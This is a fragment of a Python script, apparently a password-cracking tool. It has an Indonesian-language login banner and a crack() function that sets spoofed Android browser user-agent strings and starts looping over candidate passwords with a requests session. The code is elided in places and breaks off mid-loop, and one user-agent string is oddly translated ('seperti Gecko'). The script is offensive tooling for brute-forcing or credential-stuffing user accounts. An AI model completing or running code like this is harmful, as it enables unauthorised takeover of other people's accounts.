...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tMOHON MASUKAN COKOLATOS SIA : [green]NAGRTI_SIA_??[white]'))
...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53'
	ua2 = 'Mozilla/5.0 (Linux; Android 11; CPH2251) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
